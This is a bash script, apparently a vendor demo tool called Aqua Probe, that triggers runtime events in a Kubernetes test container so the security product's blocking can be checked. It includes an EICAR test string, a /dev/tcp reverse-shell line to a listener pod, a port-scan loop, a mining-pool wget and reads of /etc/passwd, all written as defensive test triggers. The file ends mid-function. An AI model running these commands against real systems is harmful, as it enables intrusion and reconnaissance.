#!/bin/bash

print_logo() {
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "         \033[0;33m.:-----\033[0m\033[0;31m=##*.\033[0m       .--=--.         :-==-:      ::.        :::     .:-==-.        "
    echo -e "        \033[0;33m:-------\033[0m\033[0;31m=%%%:\033[0m     -#%%%%%%%#-     +%%%%%%%%*:   %%*        %%#   :#%%%%%%%#-      "
    echo -e "      \033[0;36m:-\033[0m        \033[0;31m:%%%:\033[0m    *%%+:   :+%%*  .#%%=.  .-#%%-  %%*        %%#  +%%+:   :+%%*     "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%=       =%%- *%%.       #%%  %%*        %%# -%%+       -%%=    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:#+:\033[0m     #%%=.     -%%= .%%#-      *%%  =%%+.    :#%%.  #%%=.     .%%+    "
    echo -e "    \033[0;34m:***++++++++-.\033[0m        =%%%%#####%%=  .+%%%##*: *%%   -*%%%##%%%+.    -#%%%#####%%+    "
    echo -e "    \033[0;34m:#########+.\033[0m            .-=+++++++:     :==-   *%%     .-=++=:         .-=+++++++-    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo "                                                                                          "
    echo "                                                                                          "
    echo "     Tool developed by Eric Gomes, Senior DevSecOps Architect @ Aqua Security                                       "
    echo "                                                                                          "
    echo "                                                                                          "
}


print_welcome_message() {
    echo "=========================================================================================="
    echo "          Welcome to Aqua Probe, the Aqua Security Runtime Input Validator Tool           "
    echo "=========================================================================================="
    echo "                                                                                          "
    echo "     Explore various security features of Aqua Security with this interactive tool.       " 
    echo "     Experience Real-time Malware Protection, Drift Prevention, and much more.            "
    echo "     Get ready to dive into container security with Aqua!                                 "
    echo "                                                                                          "
    echo "=========================================================================================="
}

#
# Flags management
#
print_help() {
  echo "Usage: aqua-probe.sh [OPTIONS]"
  echo
  echo "Options:"
  echo "  --daemonset <value>, -d <value>         Set the custom daemonset name where the Aqua Enforcer is deployed (default: aqua-agent,kube-enforcer-ds)"
  echo "  --help, -h                              Show this help message and exit"
  echo "  --image <value>, -i <value>             Set the Aqua Probe test image name (default: ericgomes56/aqua-probe:1.0)"
  echo "  --namespace <value>, -ns <value>        Set the custom namespace where the Aqua Enforcer is deployed (default: aqua)"
  echo "  --no-instructions, -n                   Skip prerequisites instructions"
  echo "  --version, -v                           Show the current Aqua Probe build version"
  echo
  echo
}

handle_flags() {
  export AQUA_PROBE_IMAGE="ericgomes56/aqua-probe:1.0"
  export AQUA_PROBE_NAMESPACE="aqua"

  while [[ $# -gt 0 ]]; do  # Loop until all arguments are processed
    case "$1" in
    # Help flag 
      --help | -h)
        print_help
        exit 0
        ;;
    # Version flag
      --version | -v)
        echo
        echo "Version Build Date: 22 June 2026"
        echo
        shift  # Shift to the next argument
        ;;
    # Custom image flag
      --image | -i)
        shift   # Shift to the next argument (the image name)
        if [[ $# -gt 0 ]]; then  # Ensure an image name is provided
          image_arg="$1"  # Store the image name
          echo "Detected --image flag with argument: $image_arg"
          export AQUA_PROBE_IMAGE=$image_arg
          shift   # Shift again to consume the image name
        else
          echo "Error: --image flag requires an argument" >&2
          exit 1
        fi
        ;;
    # No instructions flag
      --no-instructions | -n)
        export AQUA_PROBE_SKIP_INSTRUCTIONS=1
        echo "Detected --no-instructions flag"
        shift   # Shift to the next argument
        ;;
    # Custom Aqua Enforcer namespace flag
      --namespace | -ns)
        shift  # Shift to the next argument (the namespace value)
        if [[ $# -gt 0 ]]; then  # Ensure a namespace value is provided
          namespace_arg="$1"  # Store the namespace value
          echo "Detected --namespace flag with argument: $namespace_arg"
          export AQUA_PROBE_NAMESPACE=$namespace_arg
          shift  # Shift again to consume the namespace value
        else
          echo "Error: --namespace flag requires an argument" >&2
          exit 1
        fi
        ;;
    # Custom daemonset name flag
      --daemonset | -ds)
        shift  # Shift to the next argument (the daemonset value)
        if [[ $# -gt 0 ]]; then  # Ensure a daemonset value is provided
          daemonset_arg="$1"  # Store the daemonset value
          echo "Detected --daemonset flag with argument: $daemonset_arg"
          export AQUA_PROBE_DAEMONSET=$daemonset_arg
          shift  # Shift again to consume the daemonset value
        else
          echo "Error: --daemonset flag requires an argument" >&2
          exit 1
        fi
        ;;
      *)
        echo "Unknown flag: $1" >&2  # Print to standard error
        shift   # Shift to the next argument
        ;;
    esac
  done
}

print_colored_message() {
    local color="$1"
    local message="$2"

    case "$color" in
        red)
            echo -e "\033[0;31m$message\033[0m"
            ;;
        blue)
            echo -e "\033[0;34m$message\033[0m"
            ;;
        green)
            echo -e "\033[0;32m$message\033[0m"
            ;;
        yellow)
            echo -e "\033[0;33m$message\033[0m"
            ;;
        *)
            echo "Invalid color. Please choose from: red, blue, green, yellow."
            ;;
    esac
}

check_kubernetes_connection() {
    echo -n "Checking Kubernetes connection"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if connected to a Kubernetes cluster
    if kubectl cluster-info &>/dev/null; then
        print_colored_message green "✓ Kubernetes cluster connected"
        echo
    else
        print_colored_message red "✗ Error: Not connected to a valid Kubernetes cluster."
        exit 1
    fi
}

check_aqua_agent_daemonset() {
    echo -n "Checking Aqua Enforcer (aqua-agent) daemonset"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if aqua-agent daemonset exists in the aqua namespace
    if kubectl get daemonset -n $AQUA_PROBE_NAMESPACE aqua-agent &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    elif kubectl get daemonset -n $AQUA_PROBE_NAMESPACE aqua-enforcer-ds &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    elif kubectl get daemonset -n $AQUA_PROBE_NAMESPACE kube-enforcer-ds &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    elif kubectl get daemonset -n $AQUA_PROBE_NAMESPACE $AQUA_PROBE_DAEMONSET &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    else
        print_colored_message red "✗ Error: Aqua Enforcer daemonset not found. Please deploy the Aqua Enforcer."
        exit 1
    fi
}

check_aqua_kube_enforcer_deployment() {
    echo -n "Checking Aqua Kube-Enforcer (aqua-kube-enforcer) deployment"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if aqua-kube-enforcer deployment exists in the Aqua namespace
    if kubectl get deployment -n $AQUA_PROBE_NAMESPACE aqua-kube-enforcer &>/dev/null; then
        print_colored_message green "✓ Aqua Kube-Enforcer deployment found"
        echo
    else
        print_colored_message red "✗ Error: Aqua Kube-Enforcer deployment not found. Please deploy the Aqua Kube-Enforcer."
        exit 1
    fi
}

#
# Test container management
#

check_container_existence() {
    # Check if the aqua-test-container deployment already exists
    kubectl get deployment aqua-test-container >/dev/null 2>&1
    return $?
}

check_pod_status() {
    local pod_name=$1
    kubectl get pods | grep $pod_name | grep -q "Running"
}

deploy_test_container() {
    # Check if the aqua-test-container deployment already exists
    if check_container_existence; then
        echo "Aqua test container already exists. Redeploying..."
        delete_test_container
    fi

    echo
    print_colored_message yellow "Deploying Aqua test container..."
    # Deploying the container using kubectl
    kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-test-container
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-test-container
  template:
    metadata:
      labels:
        app: aqua-test-container
    spec:
      containers:
      - name: aqua-probe
        image: $AQUA_PROBE_IMAGE
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF

    # Wait for the deployment to complete
    echo
    print_colored_message yellow "Waiting for the deployment to complete..."
    kubectl wait --for=condition=available deployment/aqua-test-container --timeout=60s

    # Check if deployment was successful
    if [ $? -eq 0 ]; then
        echo
        print_colored_message green "✓ Aqua test container deployed successfully."
        echo
    else
        print_colored_message red " Failed to deploy Aqua test container."
        echo
    fi
}

delete_test_container() {
    echo "Deleting Aqua test container..."
    kubectl delete deployment aqua-test-container --ignore-not-found
}

check_listener_container_existence() {
    # Check if the listener container exists
    kubectl get pod listener >/dev/null 2>&1
    return $?
}

delete_listener_container() {
    if check_listener_container_existence; then
        echo "Deleting listener container..."
        kubectl delete pod listener --force --ignore-not-found
    fi
}

cleanup_aqua_probe_artifacts() {
    local privilege_test_pods=(
        host-network-test cap-add-test root-user-test privileged-test
        host-ipc-test host-pid-test host-userns-test host-uts-test
    )
    local standalone_test_pods=(listener volume-block-test)
    local test_deployments=(
        aqua-test-container aqua-non-compliant-image-test aqua-unregistered-image-test
    )

    echo
    print_colored_message yellow "Cleaning up Aqua Probe Kubernetes test artifacts..."

    kubectl delete deployment "${test_deployments[@]}" --ignore-not-found
    kubectl delete pod "${standalone_test_pods[@]}" --force --ignore-not-found
    kubectl delete pod "${privilege_test_pods[@]}" --ignore-not-found

    cleanup_non_compliant_resources_lab

    if command -v docker >/dev/null 2>&1; then
        echo
        print_colored_message yellow "Cleaning up Aqua Probe Docker-only test artifacts..."
        docker rm -f aqua-non-k8s-container >/dev/null 2>&1 || true
    fi
}

apply_non_compliant_resource() {
    local resource_name="$1"

    echo
    print_colored_message yellow "Applying non-compliant resource: $resource_name"
    kubectl apply -f -
}

cleanup_non_compliant_resources_lab() {
    local lab_namespace="aqua-controls-lab"
    local lab_pods=(
        host-ipc-bad host-pid-bad host-network-bad host-port-bad
        non-compliant-image-domain-bad cpu-limit-missing-bad cpu-request-missing-bad
        allow-privilege-escalation-bad caps-not-drop-all-bad caps-drop-none-bad
        latest-tag-bad disallowed-hostpath-bad hostaliases-bad
        memory-limit-missing-bad memory-request-missing-bad net-raw-bad
        proc-mount-unmasked-bad privileged-port-bad privileged-bad writable-rootfs-bad
        runs-as-root-bad low-gid-bad low-uid-bad apparmor-unconfined-bad
        seccomp-unconfined-bad selinux-custom-bad sys-admin-bad sys-module-bad
        specific-capability-bad unsafe-sysctl-bad docker-sock-hostpath-bad
        hostpath-volume-bad
    )
    local lab_configmaps=(configmap-secret-bad configmap-sensitive-bad)
    local lab_services=(external-ip-bad)
    local lab_roles=(
        delete-pod-logs-bad pod-exec-bad workload-manager-bad namespace-admin-bad
        namespace-secret-manager-bad
    )
    local cluster_role_bindings=(anonymous-view-bad user-admin-access-bad)
    local cluster_roles=(
        rbac-manager-bad networking-manager-bad manage-all-resources-bad
        cluster-secret-manager-bad webhookconfig-manager-bad
    )

    echo
    print_colored_message yellow "Cleaning up non-compliant resource test artifacts..."

    if kubectl get namespace "$lab_namespace" >/dev/null 2>&1; then
        kubectl delete pod "${lab_pods[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete configmap "${lab_configmaps[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete service "${lab_services[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete role "${lab_roles[@]}" -n "$lab_namespace" --ignore-not-found
    fi
    kubectl delete pod default-namespace-bad -n default --ignore-not-found
    kubectl delete clusterrolebinding "${cluster_role_bindings[@]}" --ignore-not-found
    kubectl delete clusterrole "${cluster_roles[@]}" --ignore-not-found
    kubectl delete namespace "$lab_namespace" --ignore-not-found --wait=false
}

#
# Runtime Test Cases
#

# Real-time Malware Protection 
test_realtime_malware_protection() {
  # Split and concatenate the EICAR string (done at the start for consistency)
  string1='X5O!P%@AP[4\PZX54(P^)'
  string2='7CC)7}$EICAR-STANDARD'
  string3='-ANTIVIRUS-TEST-FILE!$H+H*'
  eicar_string="$string1$string2$string3"

  if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
    prerequisites_met="Y"
  else
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Real-time Malware Protection Control enabled
    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
    3. Ensure that the Custom Policy is set to 'Enforce' mode
    4. Ensure that Block Container Exec Control is disabled"

    echo
    read -p "Proceed? (y/n): " prerequisites_met
  fi

  case $prerequisites_met in
    [Yy]*)
      if check_container_existence; then
        pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
        container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
        echo
        print_colored_message yellow "Executing 'ls -la' command in the container..."
        echo
        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
        sleep 1.5

        # Create the eicar.txt file and write the concatenated string
        echo
        print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
        echo
        kubectl exec -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
        if [ $? -eq 0 ]; then
          echo
          print_colored_message yellow "Eicar string written to file successfully."
        else
          echo
          print_colored_message red "Failed to write Eicar string to file."
        fi
        
        sleep 1.5
        echo
        print_colored_message yellow "Executing 'ls -la' command again in the container..."
        echo
        print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
        echo
        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
        echo
        print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."

      else  
        print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
      fi
      ;;

    [Nn]*)
      echo "Please ensure the prerequisites are met before proceeding."
      ;;
    *)
      echo "Invalid input. Please enter 'y' for yes or 'n' for no."
      ;;
  esac
}


# Drift Prevention
test_drift_prevention() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Drift Prevention Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Make a copy of /bin/ls and execute the copy
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
                kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
                echo
                print_colored_message yellow "Executing '/tmp/wget_copy' command in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
                kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Cryptomining
test_block_cryptocurrency_mining() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Cryptocurrency Mining Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Fileless Exec
test_block_fileless_execution() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Fileless Execution Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing './memrun MASTER_HACKER_PROCESS_NAME_1337 target' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- ./tmp/memrun MASTER_HACKER_PROCESS_NAME_1337 /tmp/target
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Reverse Shell
test_reverse_shell() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Reverse Shell Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                # Create a listener pod with nc listener
                echo
                print_colored_message yellow "Creating listener pod"
                kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: listener
  labels:
    run: listener
spec:
  containers:
  - name: listener
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command:
    - sleep
    args:
    - infinity
EOF
                echo
                print_colored_message yellow "Waiting for the listener container pod to start running..."
                while ! kubectl get pods | grep listener | grep -q "Running"; do
                    sleep 5
                done
                echo
                print_colored_message yellow "Listener container pod is running. Configuring nc listener in pod..."
                echo
                kubectl exec listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                echo
                print_colored_message yellow "Retrieving IP address..."
                listener_pod_ip=$(kubectl get pods -o wide | grep listener | awk '{print $6}')
                echo "$listener_pod_ip"
                echo
                print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
                echo
                aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                echo
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Executables Blocked
test_executables_blocked() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Executables Block Control enabled
        2. Add 'ps' to the list of blocked executables 
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing the blocked 'ps' command in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- bash -c ps"
                echo
                kubectl exec -it $pod_name --container $container_name -- bash -c "ps"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Container Exec
test_block_container_exec() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Container Exec Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo "Executing shell session in the Aqua test application container..."
                echo
        kubectl exec -it $pod_name --container $container_name -- bash
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Bad DNS/IP Reputation
test_bad_dns_ip_reputation() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Bad DNS/IP Reputation Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'curl https://68.183.212.246' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- curl https://68.183.212.246
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# File Block
test_file_block() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with File Block Control enabled
        2. Add '/etc/passwd' to the list of blocked files
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'cat /etc/passwd' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- cat /etc/passwd
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Package Block
test_package_block() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Package Block Control enabled
        2. Add 'tar' to the list of blocked packages
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'tar' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- tar
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Port Scanning Detection
test_port_scanning_detection() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Port Scanning Detection Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing port scan command in the container..."
                echo
                echo 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                kubectl exec -it $pod_name --container $container_name -- bash -c 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-compliant Images
test_block_non_compliant_images() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Update the Assurance Policy to check for Malware
